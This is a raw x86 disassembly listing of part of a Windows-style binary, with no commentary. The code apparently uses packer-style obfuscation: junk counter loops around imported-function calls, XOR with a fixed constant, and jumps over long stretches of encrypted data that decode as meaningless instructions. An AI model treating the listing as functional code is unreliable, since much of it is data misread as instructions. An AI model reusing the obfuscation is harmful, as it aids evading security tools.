  40b037:	cmp    DWORD PTR ds:0x41abca,0x1d
  40b03e:	jne    0x40b054
  40b044:	push   0x27af
  40b049:	push   0x17d7
  40b04e:	call   DWORD PTR ds:0x40d028
  40b054:	jmp    0x40b01b
  40b059:	or     esi,edi
  40b05b:	mov    esi,0x7879
  40b060:	mov    edi,0x1556
  40b065:	mov    DWORD PTR ds:0x4235c3,0x3a32
  40b06f:	xchg   esi,ecx
  40b071:	mov    ecx,DWORD PTR ds:0x41238c
  40b077:	mov    ecx,DWORD PTR [ecx]
  40b079:	or     DWORD PTR ds:0x417e49,ecx
  40b07f:	sub    edx,edi
  40b081:	and    ecx,DWORD PTR ds:0x412368
  40b087:	xor    esi,esi
  40b089:	adc    ecx,DWORD PTR ds:0x4235bf
  40b08f:	mov    DWORD PTR [ebp-0x28],esi
  40b092:	mov    DWORD PTR [ebp-0x2c],esi
  40b095:	add    ecx,DWORD PTR ds:0x41abd6
  40b09b:	mov    DWORD PTR [ebp-0x14],esi
  40b09e:	and    DWORD PTR ds:0x41510d,ebx
  40b0a4:	jmp    0x40b189
  40b0a9:	scas   al,BYTE PTR es:[edi]
  40b0aa:	mov    ch,0x8b
  40b0ac:	imul   edi,DWORD PTR [ecx+0x69],0x6e
  40b0b0:	pop    ecx
  40b0b1:	(bad)  
  40b0b2:	pusha  
  40b0b3:	fisttp WORD PTR [ecx+0x43]
  40b0b6:	sbb    ch,BYTE PTR [ebp+0x7e3fc9a0]
  40b0bc:	jle    0x40b074
  40b0be:	jle    0x40b13e
  40b0c0:	jle    0x40b0fe
  40b0c2:	inc    edx
  40b0c3:	mov    ecx,0x40f30d28
  40b0c8:	push   edi
  40b0c9:	and    DWORD PTR [esi+0x2d],0xffffff84
  40b0cd:	mov    cl,0x6b
  40b0cf:	pop    ds
  40b0d0:	sbb    DWORD PTR [ecx-0x68dbb8b6],ebx
  40b0d6:	cld    
  40b0d7:	push   ss
  40b0d8:	inc    esp
  40b0d9:	mov    bh,0x1c
  40b0db:	or     al,BYTE PTR [esi-0x30d77faf]
  40b0e1:	shr    DWORD PTR [edi+0x5],1
  40b0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0e5:	sub    DWORD PTR [eax+0x5b],esp
  40b0e8:	xchg   ebp,eax
  40b0e9:	data16 fistp WORD PTR [edx+0x10a0f214]
  40b0f0:	sbb    BYTE PTR [edx+0x3a5dd666],cl
  40b0f6:	hlt    
  40b0f7:	aas    
  40b0f8:	pop    eax
  40b0f9:	sub    ch,BYTE PTR ds:0xa3713879
  40b0ff:	xlat   BYTE PTR fs:[ebx]
  40b101:	pop    ebx
  40b102:	jns    0x40b112
  40b104:	xor    eax,0x689f87a3
  40b109:	and    eax,0x7cd6a9f6
  40b10e:	xchg   BYTE PTR [ecx+0x30],dh
  40b111:	xchg   esp,eax
  40b112:	xchg   ebx,eax
  40b113:	das    
  40b114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b115:	xchg   esp,eax
  40b116:	imul   esi,DWORD PTR [ebx+ebp*1-0x2910cccc],0x8e4e8fd0
  40b121:	xor    BYTE PTR [edi-0x1afbb4d6],bl
  40b127:	ret    
  40b128:	test   BYTE PTR [ebp+0x7cb74bc6],ch
  40b12e:	retf   
  40b12f:	xchg   ebx,eax
  40b130:	sub    eax,0xccb55edd
  40b135:	cmp    al,0xd2
  40b137:	ja     0x40b0fc
  40b139:	sbb    al,0xa4
  40b13b:	ret    0xca61
  40b13e:	jae    0x40b170
  40b140:	jno    0x40b120
  40b142:	scas   al,BYTE PTR es:[edi]
  40b143:	les    esp,FWORD PTR [esi]
  40b145:	mov    cl,0x16
  40b147:	ret    
  40b148:	ror    DWORD PTR [edx+0x76],cl
  40b14b:	mov    ch,0xb3
  40b14d:	cdq    
  40b14e:	stos   DWORD PTR es:[edi],eax
  40b14f:	fidiv  DWORD PTR [edx+edi*2+0x4c]
  40b153:	xor    eax,0x271dcb44
  40b158:	out    dx,eax
  40b159:	inc    eax
  40b15a:	ja     0x40b1be
  40b15c:	fwait
  40b15d:	add    dl,BYTE PTR [ebx]
  40b15f:	xor    al,0x8
  40b161:	in     al,dx
  40b162:	outs   dx,DWORD PTR ds:[esi]
  40b163:	mov    DWORD PTR [ebx],esi
  40b165:	retf   0x66ba
  40b168:	add    al,0xab
  40b16a:	lahf   
  40b16b:	mov    bl,0xc8
  40b16d:	or     al,0x92
  40b16f:	xor    ecx,esp
  40b171:	add    al,0x65
  40b173:	xlat   BYTE PTR ds:[ebx]
  40b174:	repnz or eax,0x1732dcbe
  40b17a:	fwait
  40b17b:	pop    esp
  40b17c:	push   ds
  40b17d:	(bad)  
  40b17e:	das    
  40b17f:	das    
  40b180:	mov    ds:0xab21c8e4,eax
  40b185:	mov    DWORD PTR [eax],esp
  40b187:	scas   eax,DWORD PTR es:[edi]
  40b188:	jbe    0x40b113
  40b18a:	jne    0x40b184
  40b18c:	movzx  ecx,BYTE PTR ds:0x41abce
  40b193:	and    DWORD PTR ds:0x415115,ecx
  40b199:	jmp    0x40b27e
  40b19e:	mov    ebp,0xc5aa0686
  40b1a3:	stos   BYTE PTR es:[edi],al
  40b1a4:	popa   
  40b1a5:	jns    0x40b1e6
  40b1a7:	in     eax,dx
  40b1a8:	(bad)  
  40b1a9:	mov    ah,0x3d
  40b1ab:	sti    
  40b1ac:	es jno 0x40b1b0
  40b1af:	cmp    al,0x7e
  40b1b1:	jle    0x40b169
  40b1b3:	jle    0x40b233
  40b1b5:	jle    0x40b13a
  40b1b7:	fwait
  40b1b8:	pusha  
  40b1b9:	dec    esi
  40b1ba:	cmp    ebx,ebp
  40b1bc:	jp     0x40b15a
  40b1be:	ror    BYTE PTR ds:0x1924943a,cl
  40b1c4:	push   ebx
  40b1c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1c6:	push   ds
  40b1c7:	mov    ds:0x7a662620,eax
  40b1cc:	adc    eax,DWORD PTR [bx+di+0x1de7]
  40b1d1:	push   ebx
  40b1d2:	pop    ecx
  40b1d3:	sub    eax,0x5eaf8fd8
  40b1d8:	jae    0x40b1ed
  40b1da:	mov    dl,0x28
  40b1dc:	jl     0x40b162
  40b1de:	xchg   DWORD PTR [ebx],ecx
  40b1e0:	ret    
  40b1e1:	and    al,0xf2
  40b1e3:	xor    DWORD PTR cs:[eax],edx
  40b1e6:	xor    ebx,DWORD PTR ds:0x51f716fe
  40b1ec:	add    edi,DWORD PTR [ecx+0x31]
  40b1ef:	loopne 0x40b1be
  40b1f1:	pop    ds
  40b1f2:	bound  esp,QWORD PTR [ebp-0x234267c6]
  40b1f8:	mov    cl,0x86
  40b1fa:	and    eax,0x7fc6aca7
  40b1ff:	mov    BYTE PTR [ebp+ebx*2-0x59ca538],ch
  40b206:	imul   eax,ebx,0xffffffce
  40b209:	dec    ebx
  40b20a:	pop    ebp
  40b20b:	shl    BYTE PTR [edx],0xdf
  40b20e:	scas   eax,DWORD PTR es:[edi]
  40b20f:	sahf   
  40b210:	int3   
  40b211:	sar    DWORD PTR [ebx-0x3],0x1d
  40b215:	rcr    DWORD PTR [ecx-0x39b4a9c1],1
  40b21b:	jecxz  0x40b277
  40b21d:	jecxz  0x40b28a
  40b21f:	retf   0x143
  40b222:	xchg   edx,eax
  40b223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b224:	hlt    
  40b225:	lock ins BYTE PTR es:[edi],dx
  40b227:	int    0xb5
  40b229:	in     al,dx
  40b22a:	add    bh,BYTE PTR [ebp+0x1dba95e5]
  40b230:	in     al,dx
  40b231:	and    BYTE PTR [eax+0x6d13138e],ch
  40b237:	jbe    0x40b21d
  40b239:	outs   dx,DWORD PTR ds:[esi]
  40b23a:	xchg   ecx,eax
  40b23b:	push   0xffffffd3
  40b23d:	jle    0x40b2b5
  40b23f:	iret   
  40b240:	retf   0xb459
  40b243:	jl     0x40b1ce
  40b245:	in     al,dx
  40b246:	xor    eax,0xdc66914
  40b24b:	and    DWORD PTR ds:0x5a44d92a,edx
  40b251:	test   edx,edi
  40b253:	stos   DWORD PTR es:[edi],eax
  40b254:	fs inc ebp
  40b256:	inc    ebx
  40b257:	hlt    
  40b258:	push   ds
  40b259:	inc    ebx
  40b25a:	inc    esi
  40b25b:	cmp    DWORD PTR [ecx+ebx*8],esp
  40b25e:	pop    ss
  40b25f:	dec    edx
  40b260:	nop
  40b261:	push   ebx
  40b262:	lods   eax,DWORD PTR ds:[esi]
  40b263:	lahf   
  40b264:	in     al,dx
  40b265:	adc    DWORD PTR [ebp-0x60451559],eax
  40b26b:	mov    DWORD PTR [edx+0x79],edx
  40b26e:	ins    BYTE PTR es:[edi],dx
  40b26f:	xchg   esi,eax
  40b270:	les    edx,FWORD PTR [eax-0x128edc63]
  40b276:	popa   
  40b277:	stc    
  40b278:	addr16 jmp 0x1792380e
  40b27e:	mov    ecx,DWORD PTR [ebp-0x18]
  40b281:	sub    DWORD PTR ds:0x4150fd,0x41abda
  40b28b:	xor    ecx,eax
  40b28d:	xor    edi,edi
  40b28f:	or     DWORD PTR ds:0x41236c,edi
  40b295:	add    ecx,ebx
  40b297:	not    eax
  40b299:	mov    DWORD PTR [ebp-0x20],ecx
  40b29c:	mov    eax,DWORD PTR [ebp-0x20]
  40b29f:	je     0x40bb71
  40b2a5:	mov    eax,ds:0x415105
  40b2aa:	xor    DWORD PTR ds:0x412354,eax
  40b2b0:	mov    eax,DWORD PTR [ebp-0x4]
  40b2b3:	xor    eax,0x7510859
  40b2b8:	and    DWORD PTR ds:0x4235bf,0x412358
  40b2c2:	add    eax,ebx
  40b2c4:	mov    DWORD PTR ds:0x4235bf,0x20c7
  40b2ce:	cmp    edi,eax
  40b2d0:	jmp    0x40b3b5
  40b2d5:	push   edi
  40b2d6:	pop    es
  40b2d7:	popf   
  40b2d8:	aam    0x6d
  40b2da:	fs push edi
  40b2dc:	test   DWORD PTR [edx-0xd19a5cd],edx
  40b2e2:	pop    edi
  40b2e3:	je     0x40b2f4
  40b2e5:	pop    ecx
  40b2e6:	cmp    al,0x7e
  40b2e8:	jle    0x40b2a0
  40b2ea:	jle    0x40b36a
  40b2ec:	jle    0x40b2aa
  40b2ee:	leave  
  40b2ef:	inc    esi
  40b2f0:	shr    dh,cl
  40b2f2:	push   0xffffff83
  40b2f4:	mov    ds:0x9f2604f2,eax
  40b2f9:	aaa    
  40b2fa:	(bad)  
  40b2fb:	rol    BYTE PTR [ebp-0x40f2ee9b],cl
  40b301:	loop   0x40b318
  40b303:	shr    BYTE PTR [ebx+ecx*4+0xf],1
  40b307:	mov    al,bh
  40b309:	mov    ss,esi
  40b30b:	(bad)  
  40b30c:	fbstp  TBYTE PTR [esi-0x3438b1db]
  40b312:	popa   
  40b313:	test   al,0xd0
  40b315:	mov    ebp,0xbebffa1f
  40b31a:	inc    edx
  40b31b:	je     0x40b2ee
  40b31d:	enter  0x259,0xce
  40b321:	ja     0x40b303
  40b323:	mov    edx,0x4007df00
  40b328:	pop    esi
  40b329:	leave  
  40b32a:	das    
  40b32b:	dec    ecx
  40b32c:	pop    edi
  40b32d:	ins    DWORD PTR es:[edi],dx
  40b32e:	push   ebp
  40b32f:	jae    0x40b2b2
  40b331:	aaa    
  40b332:	in     al,0x23
  40b334:	lock lock stc 
  40b337:	add    al,0xc3
  40b339:	push   eax
  40b33a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b33b:	mov    bh,0xe8
  40b33d:	scas   eax,DWORD PTR es:[edi]
  40b33e:	xor    BYTE PTR [ecx+edi*8],bh
  40b341:	hlt    
  40b342:	or     al,BYTE PTR [eax+esi*4+0x59]
  40b346:	bound  esp,QWORD PTR [esi+0x20134c83]
  40b34c:	mov    bh,0xf5
  40b34e:	and    DWORD PTR [ebx+eiz*4],0xf84faa33
  40b355:	sbb    eax,0x99129a4b
  40b35a:	sar    DWORD PTR [ebx],cl
  40b35c:	cmp    eax,0x7209cc47
  40b361:	inc    edx
  40b362:	mov    ch,0x57
  40b364:	fcmovu st,st(1)
  40b366:	pop    ds
  40b367:	and    BYTE PTR [ecx+0x49],ch
  40b36a:	(bad)  
  40b36b:	xchg   ebx,eax
  40b36c:	repnz add BYTE PTR [edx-0x1fbed1bb],0x3a
  40b374:	div    DWORD PTR [ecx+eiz*8-0x46e1701]
  40b37b:	shr    DWORD PTR [eax+0x7b],0xd5
  40b37f:	nop
  40b380:	cdq    
  40b381:	and    ch,BYTE PTR [ecx]
  40b383:	(bad)
  40b386:	sub    BYTE PTR [ebx],ah
  40b388:	(bad)  
  40b389:	jecxz  0x40b3b1
  40b38b:	les    ebx,FWORD PTR [edx]
  40b38d:	xor    ah,BYTE PTR [ecx]
  40b38f:	sbb    al,0xd2
  40b391:	pop    esp
  40b392:	xchg   esi,eax
  40b393:	ss (bad) 
  40b395:	lahf   
  40b396:	iret   
  40b397:	daa    
  40b398:	ja     0x40b406
  40b39a:	daa    
  40b39b:	add    edi,DWORD PTR [eax+0x1aca2d96]
  40b3a1:	retf   
  40b3a2:	add    al,0x1a
  40b3a4:	loop   0x40b345
  40b3a6:	les    eax,FWORD PTR [edi+ecx*2+0x5d]
  40b3aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3ab:	push   edx
  40b3ac:	adc    al,0x95
  40b3ae:	outs   dx,BYTE PTR ds:[esi]
  40b3af:	popf   
  40b3b0:	jecxz  0x40b350
  40b3b2:	cmp    dl,ch
  40b3b4:	xchg   DWORD PTR [edi],ecx
  40b3b6:	test   DWORD PTR [edi-0xfffffb],ecx
  40b3bc:	jne    0x40b3c6
  40b3be:	mov    DWORD PTR ds:0x41abe2,0x7935
  40b3c8:	call   0x40a5e1
  40b3cd:	and    DWORD PTR ds:0x41237c,0x0
  40b3d7:	jmp    0x40b3eb
  40b3dc:	xor    ecx,ecx
  40b3de:	add    ecx,DWORD PTR ds:0x41237c
  40b3e4:	inc    ecx
  40b3e5:	mov    DWORD PTR ds:0x41237c,ecx
  40b3eb:	cmp    DWORD PTR ds:0x41237c,0x18
  40b3f2:	jae    0x40b452
  40b3f8:	cmp    DWORD PTR ds:0x41237c,0x24
  40b3ff:	jne    0x40b40e
  40b405:	push   DWORD PTR [ebp-0x14]
  40b408:	call   DWORD PTR ds:0x40d02c
  40b40e:	jmp    0x40b3dc
  40b413:	mov    DWORD PTR ds:0x415101,0x17
  40b41d:	cmp    DWORD PTR ds:0x415101,0x0
  40b424:	je     0x40b452
  40b42a:	cmp    DWORD PTR ds:0x415101,0x1d
  40b431:	jne    0x40b440
  40b437:	push   DWORD PTR [ebp-0xc]
  40b43a:	call   DWORD PTR ds:0x40d3a4
  40b440:	mov    esi,DWORD PTR ds:0x415101
  40b446:	dec    esi
  40b447:	mov    DWORD PTR ds:0x415101,esi
  40b44d:	jmp    0x40b41d
  40b452:	mov    DWORD PTR [ebp-0x20],eax
  40b455:	and    DWORD PTR ds:0x4235d3,0x0
  40b45f:	mov    eax,ds:0x4235d3
  40b464:	inc    eax
  40b465:	mov    ds:0x4235d3,eax
  40b46a:	cmp    DWORD PTR ds:0x4235d3,0x6
  40b471:	jne    0x40b485
  40b477:	push   DWORD PTR [ebp-0x10]
  40b47a:	push   0x41ad5b
  40b47f:	call   DWORD PTR ds:0x40d20c
  40b485:	cmp    DWORD PTR ds:0x4235d3,0x5
  40b48c:	jne    0x40b4a0
  40b492:	xor    eax,eax
  40b494:	or     eax,DWORD PTR ds:0x4235d3
  40b49a:	inc    eax
  40b49b:	mov    ds:0x4235d3,eax
  40b4a0:	cmp    DWORD PTR ds:0x4235d3,0x15
  40b4a7:	jb     0x40b45f
  40b4ad:	mov    DWORD PTR ds:0x41abca,0x15
  40b4b7:	cmp    DWORD PTR ds:0x41abca,0x0
  40b4be:	je     0x40b50b
  40b4c4:	cmp    DWORD PTR ds:0x41abca,0x22
  40b4cb:	jne    0x40b4f1
  40b4d1:	push   DWORD PTR [ebp-0x14]
  40b4d4:	push   DWORD PTR [ebp-0xc]
  40b4d7:	push   DWORD PTR [ebp-0x18]
  40b4da:	push   DWORD PTR [ebp-0x14]
  40b4dd:	push   DWORD PTR [ebp-0x1c]
  40b4e0:	push   DWORD PTR [ebp-0x1c]
  40b4e3:	push   0x15ca
  40b4e8:	push   DWORD PTR [ebp-0x28]
  40b4eb:	call   DWORD PTR ds:0x40d030
  40b4f1:	xor    ecx,ecx
  40b4f3:	or     ecx,DWORD PTR ds:0x41abca
  40b4f9:	dec    ecx
  40b4fa:	mov    DWORD PTR ds:0x41abca,ecx
  40b500:	jmp    0x40b4b7
  40b505:	sbb    DWORD PTR ds:0x41abd6,edi
  40b50b:	mov    eax,DWORD PTR [ebp-0x4]
  40b50e:	mov    ecx,DWORD PTR [ebp-0x20]
  40b511:	not    esi
  40b513:	mov    esi,0x7510859
  40b518:	xor    eax,esi
  40b51a:	sub    DWORD PTR ds:0x4235c7,0x7cc8
  40b524:	add    eax,ebx
  40b526:	cmp    ecx,eax
  40b528:	jmp    0x40b60d
  40b52d:	add    edi,ebx
  40b52f:	or     al,0xde
  40b531:	in     al,0xe9
  40b533:	loope  0x40b530
  40b535:	js     0x40b579
  40b537:	dec    ebp
  40b538:	inc    edi
  40b539:	nop
  40b53a:	dec    ebp
  40b53b:	dec    ebp
  40b53c:	add    dl,BYTE PTR [ecx-0x498181c3]
  40b542:	jle    0x40b5c2
  40b544:	jle    0x40b594
  40b546:	jo     0x40b4f4
  40b548:	add    eax,0x9e22dd0b
  40b54d:	popa   
  40b54e:	push   esi
  40b54f:	xor    eax,0x30c4a81d
  40b554:	mov    ebx,0x671c40a9
  40b559:	mov    esp,esp
  40b55b:	in     eax,dx
  40b55c:	or     DWORD PTR [ebx-0x75],esp
  40b55f:	xchg   ebx,eax
  40b560:	push   esi
  40b561:	test   al,0x90
  40b563:	push   es
  40b564:	mov    al,ds:0x9ab7c1f9
  40b569:	or     bl,dh
  40b56b:	cdq    
  40b56c:	call   0xc755:0xad9bbb18
  40b573:	sub    dh,BYTE PTR [ebp-0x28b1df28]
  40b579:	fdivrp st(5),st
  40b57b:	(bad)  
  40b57c:	mov    ecx,0x4baedabb
  40b581:	xchg   edx,eax
  40b582:	push   eax
  40b583:	in     al,0xb8
  40b585:	les    esp,FWORD PTR [edx]
  40b587:	inc    ecx
  40b588:	add    al,0x5f
  40b58a:	push   edi
  40b58b:	and    eax,0x3e456885
  40b590:	lea    edx,[ebp+0x9]
  40b593:	ret    
  40b594:	cdq    
  40b595:	jmp    0x1343:0x1de06467
  40b59c:	icebp  
  40b59d:	pop    edx
  40b59e:	xchg   ebp,eax
  40b59f:	pop    es
  40b5a0:	nop
  40b5a1:	inc    esp
  40b5a2:	add    al,0xa4
  40b5a4:	outs   dx,DWORD PTR ds:[esi]
  40b5a5:	fcomp  DWORD PTR [edx+0x310fb838]
  40b5ab:	mov    esp,0x55b94665
  40b5b0:	sar    BYTE PTR [edi+edi*1],1
  40b5b3:	loopne 0x40b601
  40b5b5:	loopne 0x40b5e3
  40b5b7:	xchg   edi,eax
  40b5b8:	das    
  40b5b9:	jno    0x40b588
  40b5bb:	or     eax,0xb646b1b0
  40b5c0:	add    ecx,DWORD PTR [ebx+ebp*4-0x1f]
  40b5c4:	pushf  
  40b5c5:	jle    0x40b60b
  40b5c7:	lds    ebx,FWORD PTR [edi-0x7075755c]
  40b5cd:	call   0xb51b:0x4b7c3a85
  40b5d4:	scas   eax,DWORD PTR es:[edi]
  40b5d5:	dec    edi
  40b5d6:	mov    cl,0xab
  40b5d8:	mov    edx,DWORD PTR [ebp-0x5d614497]
  40b5de:	and    DWORD PTR [ecx],esi
  40b5e0:	out    dx,al
  40b5e1:	pop    ecx
  40b5e2:	xchg   ecx,eax
  40b5e3:	pop    esp
  40b5e4:	push   edi
  40b5e5:	cmp    al,0xf
  40b5e7:	lods   eax,DWORD PTR ds:[esi]
  40b5e8:	das    
  40b5e9:	test   DWORD PTR ds:0x85ea54a2,esp
  40b5ef:	sub    al,0x16
  40b5f1:	add    BYTE PTR [esp+eiz*4],ch
  40b5f4:	mov    bh,0xa3
  40b5f6:	jp     0x40b635
  40b5f8:	pop    es
  40b5f9:	inc    eax
  40b5fa:	imul   ecx,DWORD PTR [edi+0x3c2f9316],0xed4562ad
  40b604:	or     edi,DWORD PTR [esi+0x63611b92]
  40b60a:	jns    0x40b5bb
  40b60c:	mov    WORD PTR [edi],cs
  40b60e:	test   BYTE PTR [edx+0x5],al
  40b611:	add    BYTE PTR [eax],al
  40b613:	sbb    DWORD PTR ds:0x415115,0x412368
  40b61d:	push   DWORD PTR [ebp-0x20]
  40b620:	jmp    0x40b705
  40b625:	sti    
  40b626:	loopne 0x40b67d
  40b628:	lock push ebp
  40b62a:	cdq    
  40b62b:	sti    
  40b62c:	jns    0x40b666
  40b62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62f:	pop    ecx
  40b630:	out    0x7e,al
  40b632:	inc    esi
  40b633:	mov    ds:0x7e32e971,eax
  40b638:	jle    0x40b5f0
  40b63a:	jle    0x40b6ba
  40b63c:	jle    0x40b5e1
  40b63e:	dec    ebp
  40b63f:	adc    cl,cl
  40b641:	add    eax,0x5be6701d
  40b646:	mov    esi,edi
  40b648:	arpl   WORD PTR [edx],bx
  40b64a:	cmp    esi,DWORD PTR [eax]
  40b64c:	sbb    edx,esp
  40b64e:	adc    dl,BYTE PTR [edx+0x3b]
  40b651:	sbb    al,0xee
  40b653:	fcom   QWORD PTR [eax-0x68]
  40b656:	xor    edx,DWORD PTR [ecx]
  40b658:	repnz dec ecx
  40b65a:	stos   DWORD PTR es:[edi],eax
  40b65b:	rcl    BYTE PTR [ebx],cl
  40b65d:	daa    
  40b65e:	data16 hlt 
  40b660:	dec    edi
  40b661:	daa    
  40b662:	xor    al,0x56
  40b664:	cwde   
  40b665:	or     bh,BYTE PTR [ebp+0x66]
  40b668:	addr16 xchg esi,eax
  40b66a:	jnp    0x40b6c5
  40b66c:	lods   al,BYTE PTR ds:[esi]
  40b66d:	ins    DWORD PTR es:[edi],dx
  40b66e:	sub    BYTE PTR [ebx],al
  40b670:	xor    DWORD PTR [ecx-0x40adea4f],0x7e10a8b7
  40b67a:	pop    edx
  40b67b:	fsub   st,st(3)
  40b67d:	sahf   
  40b67e:	cmp    ecx,DWORD PTR [ecx-0x7]
  40b681:	mov    ch,0xc6
  40b683:	jg     0x40b60f
  40b685:	push   esi
  40b686:	into   
  40b687:	fnop   
  40b689:	fistp  QWORD PTR [edx+0x39]
  40b68c:	ja     0x40b63c
  40b68e:	sbb    al,BYTE PTR fs:[ecx-0x64]
  40b692:	mov    bh,0x36
  40b694:	push   0xffffffc5
  40b696:	adc    DWORD PTR [edi-0x30],esp
  40b699:	sbb    al,BYTE PTR [eax-0x50]
  40b69c:	lods   al,BYTE PTR ds:[esi]
  40b69d:	int3   
  40b69e:	xchg   edx,eax
  40b69f:	shl    BYTE PTR [esi],1
  40b6a1:	sbb    DWORD PTR [ecx-0x464c517],0x3fdba63a
  40b6ab:	cwde   
  40b6ac:	pusha  
  40b6ad:	sub    al,0x9a
  40b6af:	pushf  
  40b6b0:	mov    bh,0xb6
  40b6b2:	je     0x40b670
  40b6b4:	jmp    0x40b695
  40b6b6:	mov    DWORD PTR [esi*2+0x6ae6c236],edx
  40b6bd:	jns    0x40b68a
  40b6bf:	dec    esi
  40b6c0:	mov    ds:0xddbdc617,al
  40b6c5:	ret    0x9493
  40b6c8:	ins    DWORD PTR es:[edi],dx
  40b6c9:	test   eax,0x2f436787
  40b6ce:	ins    DWORD PTR es:[edi],dx
  40b6cf:	fs jae 0x40b696
  40b6d2:	mov    esp,0xfc89d618
  40b6d7:	mov    al,ds:0x4520ca95
  40b6dc:	dec    esi
  40b6dd:	popa   
  40b6de:	test   eax,0xe2734c1d
  40b6e3:	(bad)  
  40b6e4:	xchg   esi,eax
  40b6e5:	pushf  
  40b6e6:	fcmovnu st,st(1)
  40b6e8:	sub    eax,0x94680bff
  40b6ed:	loopne 0x40b695
  40b6ef:	jle    0x40b70f
  40b6f1:	jae    0x40b6f6
  40b6f3:	xor    dh,al
  40b6f5:	icebp  
  40b6f6:	aam    0x5d
  40b6f8:	xchg   esi,eax
  40b6f9:	out    0x1a,al
  40b6fb:	xchg   esi,eax
  40b6fc:	sti    
  40b6fd:	inc    edi
  40b6fe:	xchg   ecx,eax
  40b6ff:	sub    DWORD PTR [ebx+0xe],ebp
  40b702:	shl    DWORD PTR [edi],0x85
  40b705:	push   DWORD PTR [ebp+0x8]
  40b708:	call   0x40a6ca
  40b70d:	or     DWORD PTR ds:0x41abde,edi
  40b713:	mov    DWORD PTR [ebp-0x14],eax
  40b716:	mov    eax,DWORD PTR [ebp-0x4]
  40b719:	adc    ecx,DWORD PTR ds:0x412370
  40b71f:	mov    ecx,DWORD PTR [ebp-0x14]
  40b722:	adc    DWORD PTR ds:0x4235cb,0x45e4
  40b72c:	xor    eax,esi
  40b72e:	add    eax,ebx
  40b730:	mov    DWORD PTR ds:0x415111,0x202e
  40b73a:	cmp    ecx,eax
  40b73c:	mov    DWORD PTR ds:0x412364,0x4412
  40b746:	je     0x40bb55
  40b74c:	and    DWORD PTR ds:0x417e49,0x0
  40b756:	mov    eax,ds:0x417e49
  40b75b:	inc    eax
  40b75c:	mov    ds:0x417e49,eax
  40b761:	cmp    DWORD PTR ds:0x417e49,0x22
  40b768:	jne    0x40b798
  40b76e:	push   0x415115
  40b773:	push   0x2bf6
  40b778:	push   DWORD PTR [ebp-0x14]
  40b77b:	push   0x415111
  40b780:	push   DWORD PTR [ebp-0x10]
  40b783:	push   0x41adfd
  40b788:	push   0x4def
  40b78d:	push   0x3000
  40b792:	call   DWORD PTR ds:0x40d210
  40b798:	cmp    DWORD PTR ds:0x417e49,0x12
  40b79f:	jb     0x40b756
  40b7a5:	mov    eax,DWORD PTR [ebp-0x14]
  40b7a8:	mov    eax,DWORD PTR [eax+0x18]
  40b7ab:	movzx  ecx,BYTE PTR ds:0x417e4d
  40b7b2:	sbb    DWORD PTR ds:0x41237c,ecx
  40b7b8:	mov    DWORD PTR [ebp-0x20],eax
  40b7bb:	xor    eax,eax
  40b7bd:	or     eax,DWORD PTR ds:0x412390
  40b7c3:	xor    ecx,ecx
  40b7c5:	xor    ecx,DWORD PTR ds:0x417eaa
  40b7cb:	sub    ecx,eax
  40b7cd:	sub    eax,DWORD PTR [eax+ecx*1]
  40b7d0:	mov    eax,DWORD PTR [ebp-0x14]
  40b7d3:	sub    DWORD PTR ds:0x4235c7,0x1830
  40b7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  40b7e0:	add    DWORD PTR ds:0x41235c,0x415101
  40b7ea:	add    ecx,DWORD PTR [eax+0x20]
  40b7ed:	mov    DWORD PTR [ebp-0x28],ecx
  40b7f0:	mov    DWORD PTR ds:0x417e59,0x1f
  40b7fa:	cmp    DWORD PTR ds:0x417e59,0x0
  40b801:	je     0x40b84b
  40b807:	cmp    DWORD PTR ds:0x417e59,0xf
  40b80e:	jne    0x40b823
  40b814:	push   DWORD PTR [ebp-0x1c]
  40b817:	push   DWORD PTR [ebp-0x10]
  40b81a:	push   DWORD PTR [ebp-0x28]
  40b81d:	call   DWORD PTR ds:0x40d034
  40b823:	cmp    DWORD PTR ds:0x417e59,0x10
  40b82a:	jne    0x40b83b
  40b830:	mov    eax,ds:0x417e59
  40b835:	dec    eax
  40b836:	mov    ds:0x417e59,eax
  40b83b:	mov    eax,ds:0x417e59
  40b840:	dec    eax
  40b841:	mov    ds:0x417e59,eax
  40b846:	jmp    0x40b7fa
  40b84b:	mov    eax,DWORD PTR [ebp-0x14]
  40b84e:	mov    ecx,DWORD PTR [ebp+0x8]
  40b851:	add    ecx,DWORD PTR [eax+0x24]
  40b854:	jmp    0x40b939
  40b859:	mov    ch,0x76
  40b85b:	or     DWORD PTR [ecx+ecx*2+0x59],eax
  40b85f:	pop    ecx
  40b860:	pop    es
  40b861:	aas    
  40b862:	mov    edx,0xad9623e6
  40b867:	test   ebp,ebx
  40b869:	and    DWORD PTR [ebx],esi
  40b86b:	jle    0x40b8eb
  40b86d:	mov    dh,0x7e
  40b86f:	jle    0x40b8ef
  40b871:	jp     0x40b8b6
  40b873:	fist   WORD PTR [esi]
  40b875:	arpl   WORD PTR [edx+0x4f216500],ax
  40b87b:	xchg   ebp,eax
  40b87c:	or     eax,0x329e68f2
  40b881:	nop
  40b882:	loope  0x40b88e
  40b884:	fadd   DWORD PTR [esi+0x4343ce3c]
  40b88a:	xchg   esp,eax
  40b88b:	dec    ecx
  40b88c:	adc    esi,DWORD PTR [edi+0x63]
  40b88f:	add    edx,esi
  40b891:	call   0xa83578d1
  40b896:	or     DWORD PTR [esi-0x4],0x8e33f4ba
  40b89d:	xor    al,0xb2
  40b89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8a0:	dec    edx
  40b8a1:	xor    eax,0xa41120a6
  40b8a6:	ret    0xa2b4
  40b8a9:	mov    eax,ds:0x7b68070d
  40b8ae:	lock adc edx,DWORD PTR [ecx-0x5cc51588]
  40b8b5:	or     ecx,DWORD PTR [ebp-0x43]
  40b8b8:	dec    esp
  40b8b9:	es xchg edx,eax
  40b8bb:	popf   
  40b8bc:	sub    bl,cl
  40b8be:	cmp    eax,edx
  40b8c0:	add    al,0xcc
  40b8c2:	hlt    
  40b8c3:	bt     DWORD PTR [ebp+0x2c],eax
  40b8c7:	sub    BYTE PTR [esi],dh
  40b8c9:	fcomp  DWORD PTR [ecx+0x6e]
  40b8cc:	push   DWORD PTR [ebx-0x7361cadd]
  40b8d2:	out    dx,eax
  40b8d3:	popf   
